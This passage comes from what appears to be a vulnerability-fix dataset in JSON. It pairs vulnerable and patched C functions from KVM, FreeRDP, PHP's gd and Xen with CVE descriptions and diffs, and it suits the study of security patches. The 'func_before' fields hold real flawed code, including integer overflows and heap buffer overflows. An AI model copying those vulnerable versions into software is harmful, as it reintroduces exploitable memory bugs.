        "func_before": "static void recalculate_apic_map(struct kvm *kvm)\n{\n\tstruct kvm_apic_map *new, *old = NULL;\n\tstruct kvm_vcpu *vcpu;\n\tint i;\n\n\tnew = kzalloc(sizeof(struct kvm_apic_map), GFP_KERNEL);\n\n\tmutex_lock(&kvm->arch.apic_map_lock);\n\n\tif (!new)\n\t\tgoto out;\n\n\tnew->ldr_bits = 8;\n\t/* flat mode is default */\n\tnew->cid_shift = 8;\n\tnew->cid_mask = 0;\n\tnew->lid_mask = 0xff;\n\n\tkvm_for_each_vcpu(i, vcpu, kvm) {\n\t\tstruct kvm_lapic *apic = vcpu->arch.apic;\n\t\tu16 cid, lid;\n\t\tu32 ldr;\n\n\t\tif (!kvm_apic_present(vcpu))\n\t\t\tcontinue;\n\n\t\t/*\n\t\t * All APICs have to be configured in the same mode by an OS.\n\t\t * We take advatage of this while building logical id loockup\n\t\t * table. After reset APICs are in xapic/flat mode, so if we\n\t\t * find apic with different setting we assume this is the mode\n\t\t * OS wants all apics to be in; build lookup table accordingly.\n\t\t */\n\t\tif (apic_x2apic_mode(apic)) {\n\t\t\tnew->ldr_bits = 32;\n\t\t\tnew->cid_shift = 16;\n\t\t\tnew->cid_mask = new->lid_mask = 0xffff;\n\t\t} else if (kvm_apic_sw_enabled(apic) &&\n\t\t\t\t!new->cid_mask /* flat mode */ &&\n\t\t\t\tkvm_apic_get_reg(apic, APIC_DFR) == APIC_DFR_CLUSTER) {\n\t\t\tnew->cid_shift = 4;\n\t\t\tnew->cid_mask = 0xf;\n\t\t\tnew->lid_mask = 0xf;\n\t\t}\n\n\t\tnew->phys_map[kvm_apic_id(apic)] = apic;\n\n\t\tldr = kvm_apic_get_reg(apic, APIC_LDR);\n\t\tcid = apic_cluster_id(new, ldr);\n\t\tlid = apic_logical_id(new, ldr);\n\n\t\tif (lid)\n\t\t\tnew->logical_map[cid][ffs(lid) - 1] = apic;\n\t}\nout:\n\told = rcu_dereference_protected(kvm->arch.apic_map,\n\t\t\tlockdep_is_held(&kvm->arch.apic_map_lock));\n\trcu_assign_pointer(kvm->arch.apic_map, new);\n\tmutex_unlock(&kvm->arch.apic_map_lock);\n\n\tif (old)\n\t\tkfree_rcu(old, rcu);\n\n\tkvm_vcpu_request_scan_ioapic(kvm);\n}",
        "func": "static void recalculate_apic_map(struct kvm *kvm)\n{\n\tstruct kvm_apic_map *new, *old = NULL;\n\tstruct kvm_vcpu *vcpu;\n\tint i;\n\n\tnew = kzalloc(sizeof(struct kvm_apic_map), GFP_KERNEL);\n\n\tmutex_lock(&kvm->arch.apic_map_lock);\n\n\tif (!new)\n\t\tgoto out;\n\n\tnew->ldr_bits = 8;\n\t/* flat mode is default */\n\tnew->cid_shift = 8;\n\tnew->cid_mask = 0;\n\tnew->lid_mask = 0xff;\n\n\tkvm_for_each_vcpu(i, vcpu, kvm) {\n\t\tstruct kvm_lapic *apic = vcpu->arch.apic;\n\t\tu16 cid, lid;\n\t\tu32 ldr;\n\n\t\tif (!kvm_apic_present(vcpu))\n\t\t\tcontinue;\n\n\t\t/*\n\t\t * All APICs have to be configured in the same mode by an OS.\n\t\t * We take advatage of this while building logical id loockup\n\t\t * table. After reset APICs are in xapic/flat mode, so if we\n\t\t * find apic with different setting we assume this is the mode\n\t\t * OS wants all apics to be in; build lookup table accordingly.\n\t\t */\n\t\tif (apic_x2apic_mode(apic)) {\n\t\t\tnew->ldr_bits = 32;\n\t\t\tnew->cid_shift = 16;\n\t\t\tnew->cid_mask = (1 << KVM_X2APIC_CID_BITS) - 1;\n\t\t\tnew->lid_mask = 0xffff;\n\t\t} else if (kvm_apic_sw_enabled(apic) &&\n\t\t\t\t!new->cid_mask /* flat mode */ &&\n\t\t\t\tkvm_apic_get_reg(apic, APIC_DFR) == APIC_DFR_CLUSTER) {\n\t\t\tnew->cid_shift = 4;\n\t\t\tnew->cid_mask = 0xf;\n\t\t\tnew->lid_mask = 0xf;\n\t\t}\n\n\t\tnew->phys_map[kvm_apic_id(apic)] = apic;\n\n\t\tldr = kvm_apic_get_reg(apic, APIC_LDR);\n\t\tcid = apic_cluster_id(new, ldr);\n\t\tlid = apic_logical_id(new, ldr);\n\n\t\tif (lid)\n\t\t\tnew->logical_map[cid][ffs(lid) - 1] = apic;\n\t}\nout:\n\told = rcu_dereference_protected(kvm->arch.apic_map,\n\t\t\tlockdep_is_held(&kvm->arch.apic_map_lock));\n\trcu_assign_pointer(kvm->arch.apic_map, new);\n\tmutex_unlock(&kvm->arch.apic_map_lock);\n\n\tif (old)\n\t\tkfree_rcu(old, rcu);\n\n\tkvm_vcpu_request_scan_ioapic(kvm);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -35,7 +35,8 @@\n \t\tif (apic_x2apic_mode(apic)) {\n \t\t\tnew->ldr_bits = 32;\n \t\t\tnew->cid_shift = 16;\n-\t\t\tnew->cid_mask = new->lid_mask = 0xffff;\n+\t\t\tnew->cid_mask = (1 << KVM_X2APIC_CID_BITS) - 1;\n+\t\t\tnew->lid_mask = 0xffff;\n \t\t} else if (kvm_apic_sw_enabled(apic) &&\n \t\t\t\t!new->cid_mask /* flat mode */ &&\n \t\t\t\tkvm_apic_get_reg(apic, APIC_DFR) == APIC_DFR_CLUSTER) {",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\tnew->cid_mask = new->lid_mask = 0xffff;"
            ],
            "added_lines": [
                "\t\t\tnew->cid_mask = (1 << KVM_X2APIC_CID_BITS) - 1;",
                "\t\t\tnew->lid_mask = 0xffff;"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-0791",
        "func_name": "FreeRDP/license_read_scope_list",
        "description": "Integer overflow in the license_read_scope_list function in libfreerdp/core/license.c in FreeRDP through 1.0.2 allows remote RDP servers to cause a denial of service (application crash) or possibly have unspecified other impact via a large ScopeCount value in a Scope List in a Server License Request packet.",
        "git_url": "https://github.com/FreeRDP/FreeRDP/commit/e2745807c4c3e0a590c0f69a9b655dc74ebaa03e",
        "commit_title": "Fix possible integer overflow in license_read_scope_list()",
        "commit_text": "",
        "func_before": "BOOL license_read_scope_list(wStream* s, SCOPE_LIST* scopeList)\n{\n\tUINT32 i;\n\tUINT32 scopeCount;\n\n\tif (Stream_GetRemainingLength(s) < 4)\n\t\treturn FALSE;\n\n\tStream_Read_UINT32(s, scopeCount); /* ScopeCount (4 bytes) */\n\n\tscopeList->count = scopeCount;\n\tscopeList->array = (LICENSE_BLOB*) malloc(sizeof(LICENSE_BLOB) * scopeCount);\n\n\t/* ScopeArray */\n\tfor (i = 0; i < scopeCount; i++)\n\t{\n\t\tscopeList->array[i].type = BB_SCOPE_BLOB;\n\n\t\tif (!license_read_binary_blob(s, &scopeList->array[i]))\n\t\t\treturn FALSE;\n\t}\n\n\treturn TRUE;\n}",
        "func": "BOOL license_read_scope_list(wStream* s, SCOPE_LIST* scopeList)\n{\n\tUINT32 i;\n\tUINT32 scopeCount;\n\n\tif (Stream_GetRemainingLength(s) < 4)\n\t\treturn FALSE;\n\n\tStream_Read_UINT32(s, scopeCount); /* ScopeCount (4 bytes) */\n\n        if (Stream_GetRemainingLength(s) / sizeof(LICENSE_BLOB) < scopeCount)\n                return FALSE;  /* Avoid overflow in malloc */\n\n\tscopeList->count = scopeCount;\n\tscopeList->array = (LICENSE_BLOB*) malloc(sizeof(LICENSE_BLOB) * scopeCount);\n\n\t/* ScopeArray */\n\tfor (i = 0; i < scopeCount; i++)\n\t{\n\t\tscopeList->array[i].type = BB_SCOPE_BLOB;\n\n\t\tif (!license_read_binary_blob(s, &scopeList->array[i]))\n\t\t\treturn FALSE;\n\t}\n\n\treturn TRUE;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -7,6 +7,9 @@\n \t\treturn FALSE;\n \n \tStream_Read_UINT32(s, scopeCount); /* ScopeCount (4 bytes) */\n+\n+        if (Stream_GetRemainingLength(s) / sizeof(LICENSE_BLOB) < scopeCount)\n+                return FALSE;  /* Avoid overflow in malloc */\n \n \tscopeList->count = scopeCount;\n \tscopeList->array = (LICENSE_BLOB*) malloc(sizeof(LICENSE_BLOB) * scopeCount);",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "",
                "        if (Stream_GetRemainingLength(s) / sizeof(LICENSE_BLOB) < scopeCount)",
                "                return FALSE;  /* Avoid overflow in malloc */"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-7226",
        "func_name": "php/php-src/gdImageCrop",
        "description": "Integer overflow in the gdImageCrop function in ext/gd/gd.c in PHP 5.5.x before 5.5.9 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via an imagecrop function call with a large x dimension value, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/8f4a5373bb71590352fd934028d6dde5bc18530b",
        "commit_title": "Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop())",
        "commit_text": " Initial fix was PHP stuff This one is libgd fix.  - filter invalid crop size - dont try to copy on invalid position - fix crop size when out of src image - fix possible NULL deref - fix possible integer overfloow",
        "func_before": "gdImagePtr gdImageCrop(gdImagePtr src, const gdRectPtr crop)\n{\n\tgdImagePtr dst;\n\n\tif (src->trueColor) {\n\t\tdst = gdImageCreateTrueColor(crop->width, crop->height);\n\t\tgdImageSaveAlpha(dst, 1);\n\t} else {\n\t\tdst = gdImageCreate(crop->width, crop->height);\n\t\tgdImagePaletteCopy(dst, src);\n\t}\n\tdst->transparent = src->transparent;\n\n\tif (src->sx < (crop->x + crop->width -1)) {\n\t\tcrop->width = src->sx - crop->x + 1;\n\t}\n\tif (src->sy < (crop->y + crop->height -1)) {\n\t\tcrop->height = src->sy - crop->y + 1;\n\t}\n#if 0\nprintf(\"rect->x: %i\\nrect->y: %i\\nrect->width: %i\\nrect->height: %i\\n\", crop->x, crop->y, crop->width, crop->height);\n#endif\n\tif (dst == NULL) {\n\t\treturn NULL;\n\t} else {\n\t\tint y = crop->y;\n\t\tif (src->trueColor) {\n\t\t\tunsigned int dst_y = 0;\n\t\t\twhile (y < (crop->y + (crop->height - 1))) {\n\t\t\t\t/* TODO: replace 4 w/byte per channel||pitch once available */\n\t\t\t\tmemcpy(dst->tpixels[dst_y++], src->tpixels[y++] + crop->x, crop->width * 4);\n\t\t\t}\n\t\t} else {\n\t\t\tint x;\n\t\t\tfor (y = crop->y; y < (crop->y + (crop->height - 1)); y++) {\n\t\t\t\tfor (x = crop->x; x < (crop->x + (crop->width - 1)); x++) {\n\t\t\t\t\tdst->pixels[y - crop->y][x - crop->x] = src->pixels[y][x];\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn dst;\n\t}\n}",
        "func": "gdImagePtr gdImageCrop(gdImagePtr src, const gdRectPtr crop)\n{\n\tgdImagePtr dst;\n\n\t/* check size */\n\tif (crop->width<=0 || crop->height<=0) {\n\t\treturn NULL;\n\t}\n\n\t/* allocate the requested size (could be only partially filled) */\n\tif (src->trueColor) {\n\t\tdst = gdImageCreateTrueColor(crop->width, crop->height);\n\t\tgdImageSaveAlpha(dst, 1);\n\t} else {\n\t\tdst = gdImageCreate(crop->width, crop->height);\n\t\tgdImagePaletteCopy(dst, src);\n\t}\n\tif (dst == NULL) {\n\t\treturn NULL;\n\t}\n\tdst->transparent = src->transparent;\n\n\t/* check position in the src image */\n\tif (crop->x < 0 || crop->x>=src->sx || crop->y<0 || crop->y>=src->sy) {\n\t\treturn dst;\n\t}\n\n\t/* reduce size if needed */\n\tif ((src->sx - crop->width) < crop->x) {\n\t\tcrop->width = src->sx - crop->x;\n\t}\n\tif ((src->sy - crop->height) < crop->y) {\n\t\tcrop->height = src->sy - crop->y;\n\t}\n\n#if 0\nprintf(\"rect->x: %i\\nrect->y: %i\\nrect->width: %i\\nrect->height: %i\\n\", crop->x, crop->y, crop->width, crop->height);\n#endif\n\tint y = crop->y;\n\tif (src->trueColor) {\n\t\tunsigned int dst_y = 0;\n\t\twhile (y < (crop->y + (crop->height - 1))) {\n\t\t\t/* TODO: replace 4 w/byte per channel||pitch once available */\n\t\t\tmemcpy(dst->tpixels[dst_y++], src->tpixels[y++] + crop->x, crop->width * 4);\n\t\t}\n\t} else {\n\t\tint x;\n\t\tfor (y = crop->y; y < (crop->y + (crop->height - 1)); y++) {\n\t\t\tfor (x = crop->x; x < (crop->x + (crop->width - 1)); x++) {\n\t\t\t\tdst->pixels[y - crop->y][x - crop->x] = src->pixels[y][x];\n\t\t\t}\n\t\t}\n\t}\n\treturn dst;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,6 +2,12 @@\n {\n \tgdImagePtr dst;\n \n+\t/* check size */\n+\tif (crop->width<=0 || crop->height<=0) {\n+\t\treturn NULL;\n+\t}\n+\n+\t/* allocate the requested size (could be only partially filled) */\n \tif (src->trueColor) {\n \t\tdst = gdImageCreateTrueColor(crop->width, crop->height);\n \t\tgdImageSaveAlpha(dst, 1);\n@@ -9,35 +15,41 @@\n \t\tdst = gdImageCreate(crop->width, crop->height);\n \t\tgdImagePaletteCopy(dst, src);\n \t}\n+\tif (dst == NULL) {\n+\t\treturn NULL;\n+\t}\n \tdst->transparent = src->transparent;\n \n-\tif (src->sx < (crop->x + crop->width -1)) {\n-\t\tcrop->width = src->sx - crop->x + 1;\n+\t/* check position in the src image */\n+\tif (crop->x < 0 || crop->x>=src->sx || crop->y<0 || crop->y>=src->sy) {\n+\t\treturn dst;\n \t}\n-\tif (src->sy < (crop->y + crop->height -1)) {\n-\t\tcrop->height = src->sy - crop->y + 1;\n+\n+\t/* reduce size if needed */\n+\tif ((src->sx - crop->width) < crop->x) {\n+\t\tcrop->width = src->sx - crop->x;\n \t}\n+\tif ((src->sy - crop->height) < crop->y) {\n+\t\tcrop->height = src->sy - crop->y;\n+\t}\n+\n #if 0\n printf(\"rect->x: %i\\nrect->y: %i\\nrect->width: %i\\nrect->height: %i\\n\", crop->x, crop->y, crop->width, crop->height);\n #endif\n-\tif (dst == NULL) {\n-\t\treturn NULL;\n+\tint y = crop->y;\n+\tif (src->trueColor) {\n+\t\tunsigned int dst_y = 0;\n+\t\twhile (y < (crop->y + (crop->height - 1))) {\n+\t\t\t/* TODO: replace 4 w/byte per channel||pitch once available */\n+\t\t\tmemcpy(dst->tpixels[dst_y++], src->tpixels[y++] + crop->x, crop->width * 4);\n+\t\t}\n \t} else {\n-\t\tint y = crop->y;\n-\t\tif (src->trueColor) {\n-\t\t\tunsigned int dst_y = 0;\n-\t\t\twhile (y < (crop->y + (crop->height - 1))) {\n-\t\t\t\t/* TODO: replace 4 w/byte per channel||pitch once available */\n-\t\t\t\tmemcpy(dst->tpixels[dst_y++], src->tpixels[y++] + crop->x, crop->width * 4);\n-\t\t\t}\n-\t\t} else {\n-\t\t\tint x;\n-\t\t\tfor (y = crop->y; y < (crop->y + (crop->height - 1)); y++) {\n-\t\t\t\tfor (x = crop->x; x < (crop->x + (crop->width - 1)); x++) {\n-\t\t\t\t\tdst->pixels[y - crop->y][x - crop->x] = src->pixels[y][x];\n-\t\t\t\t}\n+\t\tint x;\n+\t\tfor (y = crop->y; y < (crop->y + (crop->height - 1)); y++) {\n+\t\t\tfor (x = crop->x; x < (crop->x + (crop->width - 1)); x++) {\n+\t\t\t\tdst->pixels[y - crop->y][x - crop->x] = src->pixels[y][x];\n \t\t\t}\n \t\t}\n-\t\treturn dst;\n \t}\n+\treturn dst;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (src->sx < (crop->x + crop->width -1)) {",
                "\t\tcrop->width = src->sx - crop->x + 1;",
                "\tif (src->sy < (crop->y + crop->height -1)) {",
                "\t\tcrop->height = src->sy - crop->y + 1;",
                "\tif (dst == NULL) {",
                "\t\treturn NULL;",
                "\t\tint y = crop->y;",
                "\t\tif (src->trueColor) {",
                "\t\t\tunsigned int dst_y = 0;",
                "\t\t\twhile (y < (crop->y + (crop->height - 1))) {",
                "\t\t\t\t/* TODO: replace 4 w/byte per channel||pitch once available */",
                "\t\t\t\tmemcpy(dst->tpixels[dst_y++], src->tpixels[y++] + crop->x, crop->width * 4);",
                "\t\t\t}",
                "\t\t} else {",
                "\t\t\tint x;",
                "\t\t\tfor (y = crop->y; y < (crop->y + (crop->height - 1)); y++) {",
                "\t\t\t\tfor (x = crop->x; x < (crop->x + (crop->width - 1)); x++) {",
                "\t\t\t\t\tdst->pixels[y - crop->y][x - crop->x] = src->pixels[y][x];",
                "\t\t\t\t}",
                "\t\treturn dst;"
            ],
            "added_lines": [
                "\t/* check size */",
                "\tif (crop->width<=0 || crop->height<=0) {",
                "\t\treturn NULL;",
                "\t}",
                "",
                "\t/* allocate the requested size (could be only partially filled) */",
                "\tif (dst == NULL) {",
                "\t\treturn NULL;",
                "\t}",
                "\t/* check position in the src image */",
                "\tif (crop->x < 0 || crop->x>=src->sx || crop->y<0 || crop->y>=src->sy) {",
                "\t\treturn dst;",
                "",
                "\t/* reduce size if needed */",
                "\tif ((src->sx - crop->width) < crop->x) {",
                "\t\tcrop->width = src->sx - crop->x;",
                "\tif ((src->sy - crop->height) < crop->y) {",
                "\t\tcrop->height = src->sy - crop->y;",
                "\t}",
                "",
                "\tint y = crop->y;",
                "\tif (src->trueColor) {",
                "\t\tunsigned int dst_y = 0;",
                "\t\twhile (y < (crop->y + (crop->height - 1))) {",
                "\t\t\t/* TODO: replace 4 w/byte per channel||pitch once available */",
                "\t\t\tmemcpy(dst->tpixels[dst_y++], src->tpixels[y++] + crop->x, crop->width * 4);",
                "\t\t}",
                "\t\tint x;",
                "\t\tfor (y = crop->y; y < (crop->y + (crop->height - 1)); y++) {",
                "\t\t\tfor (x = crop->x; x < (crop->x + (crop->width - 1)); x++) {",
                "\t\t\t\tdst->pixels[y - crop->y][x - crop->x] = src->pixels[y][x];",
                "\treturn dst;"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-7226",
        "func_name": "php/php-src/php_imagepolygon",
        "description": "Integer overflow in the gdImageCrop function in ext/gd/gd.c in PHP 5.5.x before 5.5.9 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via an imagecrop function call with a large x dimension value, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/2938329ce19cb8c4197dec146c3ec887c6f61d01",
        "commit_title": "Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop())",
        "commit_text": " And also fixed the bug: arguments are altered after some calls",
        "func_before": "static void php_imagepolygon(INTERNAL_FUNCTION_PARAMETERS, int filled)\n{\n\tzval *IM, *POINTS;\n\tlong NPOINTS, COL;\n\tzval **var = NULL;\n\tgdImagePtr im;\n\tgdPointPtr points;\n\tint npoints, col, nelem, i;\n\n\tif (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, \"rall\", &IM, &POINTS, &NPOINTS, &COL) == FAILURE) {\n\t\treturn;\n\t}\n\n\tZEND_FETCH_RESOURCE(im, gdImagePtr, &IM, -1, \"Image\", le_gd);\n\n\tnpoints = NPOINTS;\n\tcol = COL;\n\n\tnelem = zend_hash_num_elements(Z_ARRVAL_P(POINTS));\n\tif (nelem < 6) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"You must have at least 3 points in your array\");\n\t\tRETURN_FALSE;\n\t}\n\tif (npoints <= 0) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"You must give a positive number of points\");\n\t\tRETURN_FALSE;\n\t}\n\tif (nelem < npoints * 2) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Trying to use %d points in array with only %d points\", npoints, nelem/2);\n\t\tRETURN_FALSE;\n\t}\n\n\tpoints = (gdPointPtr) safe_emalloc(npoints, sizeof(gdPoint), 0);\n\n\tfor (i = 0; i < npoints; i++) {\n\t\tif (zend_hash_index_find(Z_ARRVAL_P(POINTS), (i * 2), (void **) &var) == SUCCESS) {\n\t\t\tSEPARATE_ZVAL((var));\n\t\t\tconvert_to_long(*var);\n\t\t\tpoints[i].x = Z_LVAL_PP(var);\n\t\t}\n\t\tif (zend_hash_index_find(Z_ARRVAL_P(POINTS), (i * 2) + 1, (void **) &var) == SUCCESS) {\n\t\t\tSEPARATE_ZVAL(var);\n\t\t\tconvert_to_long(*var);\n\t\t\tpoints[i].y = Z_LVAL_PP(var);\n\t\t}\n\t}\n\n\tif (filled) {\n\t\tgdImageFilledPolygon(im, points, npoints, col);\n\t} else {\n\t\tgdImagePolygon(im, points, npoints, col);\n\t}\n\n\tefree(points);\n\tRETURN_TRUE;\n}",
        "func": "static void php_imagepolygon(INTERNAL_FUNCTION_PARAMETERS, int filled)\n{\n\tzval *IM, *POINTS;\n\tlong NPOINTS, COL;\n\tzval **var = NULL;\n\tgdImagePtr im;\n\tgdPointPtr points;\n\tint npoints, col, nelem, i;\n\n\tif (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, \"rall\", &IM, &POINTS, &NPOINTS, &COL) == FAILURE) {\n\t\treturn;\n\t}\n\n\tZEND_FETCH_RESOURCE(im, gdImagePtr, &IM, -1, \"Image\", le_gd);\n\n\tnpoints = NPOINTS;\n\tcol = COL;\n\n\tnelem = zend_hash_num_elements(Z_ARRVAL_P(POINTS));\n\tif (nelem < 6) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"You must have at least 3 points in your array\");\n\t\tRETURN_FALSE;\n\t}\n\tif (npoints <= 0) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"You must give a positive number of points\");\n\t\tRETURN_FALSE;\n\t}\n\tif (nelem < npoints * 2) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Trying to use %d points in array with only %d points\", npoints, nelem/2);\n\t\tRETURN_FALSE;\n\t}\n\n\tpoints = (gdPointPtr) safe_emalloc(npoints, sizeof(gdPoint), 0);\n\n\tfor (i = 0; i < npoints; i++) {\n\t\tif (zend_hash_index_find(Z_ARRVAL_P(POINTS), (i * 2), (void **) &var) == SUCCESS) {\n\t\t\tif (Z_TYPE_PP(var) != IS_LONG) {\n\t\t\t\tzval lval;\n\t\t\t\tlval = **var;\n\t\t\t\tzval_copy_ctor(&lval);\n\t\t\t\tconvert_to_long(&lval);\n\t\t\t\tpoints[i].x = Z_LVAL(lval);\n\t\t\t} else {\n\t\t\t\tpoints[i].x = Z_LVAL_PP(var);\n\t\t\t}\n\t\t}\n\t\tif (zend_hash_index_find(Z_ARRVAL_P(POINTS), (i * 2) + 1, (void **) &var) == SUCCESS) {\n\t\t\tif (Z_TYPE_PP(var) != IS_LONG) {\n\t\t\t\tzval lval;\n\t\t\t\tlval = **var;\n\t\t\t\tzval_copy_ctor(&lval);\n\t\t\t\tconvert_to_long(&lval);\n\t\t\t\tpoints[i].y = Z_LVAL(lval);\n\t\t\t} else {\n\t\t\t\tpoints[i].y = Z_LVAL_PP(var);\n\t\t\t}\n\t\t}\n\t}\n\n\tif (filled) {\n\t\tgdImageFilledPolygon(im, points, npoints, col);\n\t} else {\n\t\tgdImagePolygon(im, points, npoints, col);\n\t}\n\n\tefree(points);\n\tRETURN_TRUE;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -34,14 +34,26 @@\n \n \tfor (i = 0; i < npoints; i++) {\n \t\tif (zend_hash_index_find(Z_ARRVAL_P(POINTS), (i * 2), (void **) &var) == SUCCESS) {\n-\t\t\tSEPARATE_ZVAL((var));\n-\t\t\tconvert_to_long(*var);\n-\t\t\tpoints[i].x = Z_LVAL_PP(var);\n+\t\t\tif (Z_TYPE_PP(var) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **var;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\tpoints[i].x = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\tpoints[i].x = Z_LVAL_PP(var);\n+\t\t\t}\n \t\t}\n \t\tif (zend_hash_index_find(Z_ARRVAL_P(POINTS), (i * 2) + 1, (void **) &var) == SUCCESS) {\n-\t\t\tSEPARATE_ZVAL(var);\n-\t\t\tconvert_to_long(*var);\n-\t\t\tpoints[i].y = Z_LVAL_PP(var);\n+\t\t\tif (Z_TYPE_PP(var) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **var;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\tpoints[i].y = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\tpoints[i].y = Z_LVAL_PP(var);\n+\t\t\t}\n \t\t}\n \t}\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\tSEPARATE_ZVAL((var));",
                "\t\t\tconvert_to_long(*var);",
                "\t\t\tpoints[i].x = Z_LVAL_PP(var);",
                "\t\t\tSEPARATE_ZVAL(var);",
                "\t\t\tconvert_to_long(*var);",
                "\t\t\tpoints[i].y = Z_LVAL_PP(var);"
            ],
            "added_lines": [
                "\t\t\tif (Z_TYPE_PP(var) != IS_LONG) {",
                "\t\t\t\tzval lval;",
                "\t\t\t\tlval = **var;",
                "\t\t\t\tzval_copy_ctor(&lval);",
                "\t\t\t\tconvert_to_long(&lval);",
                "\t\t\t\tpoints[i].x = Z_LVAL(lval);",
                "\t\t\t} else {",
                "\t\t\t\tpoints[i].x = Z_LVAL_PP(var);",
                "\t\t\t}",
                "\t\t\tif (Z_TYPE_PP(var) != IS_LONG) {",
                "\t\t\t\tzval lval;",
                "\t\t\t\tlval = **var;",
                "\t\t\t\tzval_copy_ctor(&lval);",
                "\t\t\t\tconvert_to_long(&lval);",
                "\t\t\t\tpoints[i].y = Z_LVAL(lval);",
                "\t\t\t} else {",
                "\t\t\t\tpoints[i].y = Z_LVAL_PP(var);",
                "\t\t\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1891",
        "func_name": "xen-project/xen/flask_security_set_bool",
        "description": "Multiple integer overflows in the (1) FLASK_GETBOOL, (2) FLASK_SETBOOL, (3) FLASK_USER, and (4) FLASK_CONTEXT_TO_SID suboperations in the flask hypercall in Xen 4.3.x, 4.2.x, 4.1.x, 3.2.x, and earlier, when XSM is enabled, allow local users to cause a denial of service (processor fault) via unspecified vectors, a different vulnerability than CVE-2014-1892, CVE-2014-1893, and CVE-2014-1894.",
        "git_url": "https://github.com/xen-project/xen/commit/6c79e0ab9ac6042e60434c02e1d99b0cf0cc3470",
        "commit_title": "flask: fix reading strings from guest memory",
        "commit_text": " Since the string size is being specified by the guest, we must range check it properly before doing allocations based on it. While for the two cases that are exposed only to trusted guests (via policy restriction) this just uses an arbitrary upper limit (PAGE_SIZE), for the FLASK_[GS]ETBOOL case (which any guest can use) the upper limit gets enforced based on the longest name across all boolean settings.  This is XSA-84. ",
        "func_before": "static int flask_security_set_bool(struct xen_flask_boolean *arg)\n{\n    int rv;\n\n    rv = flask_security_resolve_bool(arg);\n    if ( rv )\n        return rv;\n\n    rv = domain_has_security(current->domain, SECURITY__SETBOOL);\n    if ( rv )\n        return rv;\n\n    spin_lock(&sel_sem);\n\n    if ( arg->commit )\n    {\n        int num;\n        int *values;\n\n        rv = security_get_bools(&num, NULL, &values);\n        if ( rv != 0 )\n            goto out;\n\n        if ( arg->bool_id >= num )\n        {\n            rv = -ENOENT;\n            goto out;\n        }\n        values[arg->bool_id] = !!(arg->new_value);\n\n        arg->enforcing = arg->pending = !!(arg->new_value);\n\n        if ( bool_pending_values )\n            bool_pending_values[arg->bool_id] = !!(arg->new_value);\n\n        rv = security_set_bools(num, values);\n        xfree(values);\n    }\n    else\n    {\n        if ( !bool_pending_values )\n            flask_security_make_bools();\n\n        if ( arg->bool_id >= bool_num )\n            goto out;\n\n        bool_pending_values[arg->bool_id] = !!(arg->new_value);\n        arg->pending = !!(arg->new_value);\n        arg->enforcing = security_get_bool_value(arg->bool_id);\n\n        rv = 0;\n    }\n\n out:\n    spin_unlock(&sel_sem);\n    return rv;\n}",
        "func": "static int flask_security_set_bool(struct xen_flask_boolean *arg)\n{\n    int rv;\n\n    rv = flask_security_resolve_bool(arg);\n    if ( rv )\n        return rv;\n\n    rv = domain_has_security(current->domain, SECURITY__SETBOOL);\n    if ( rv )\n        return rv;\n\n    spin_lock(&sel_sem);\n\n    if ( arg->commit )\n    {\n        int num;\n        int *values;\n\n        rv = security_get_bools(&num, NULL, &values, NULL);\n        if ( rv != 0 )\n            goto out;\n\n        if ( arg->bool_id >= num )\n        {\n            rv = -ENOENT;\n            goto out;\n        }\n        values[arg->bool_id] = !!(arg->new_value);\n\n        arg->enforcing = arg->pending = !!(arg->new_value);\n\n        if ( bool_pending_values )\n            bool_pending_values[arg->bool_id] = !!(arg->new_value);\n\n        rv = security_set_bools(num, values);\n        xfree(values);\n    }\n    else\n    {\n        if ( !bool_pending_values )\n            flask_security_make_bools();\n\n        if ( arg->bool_id >= bool_num )\n            goto out;\n\n        bool_pending_values[arg->bool_id] = !!(arg->new_value);\n        arg->pending = !!(arg->new_value);\n        arg->enforcing = security_get_bool_value(arg->bool_id);\n\n        rv = 0;\n    }\n\n out:\n    spin_unlock(&sel_sem);\n    return rv;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -17,7 +17,7 @@\n         int num;\n         int *values;\n \n-        rv = security_get_bools(&num, NULL, &values);\n+        rv = security_get_bools(&num, NULL, &values, NULL);\n         if ( rv != 0 )\n             goto out;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "        rv = security_get_bools(&num, NULL, &values);"
            ],
            "added_lines": [
                "        rv = security_get_bools(&num, NULL, &values, NULL);"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1891",
        "func_name": "xen-project/xen/flask_security_resolve_bool",
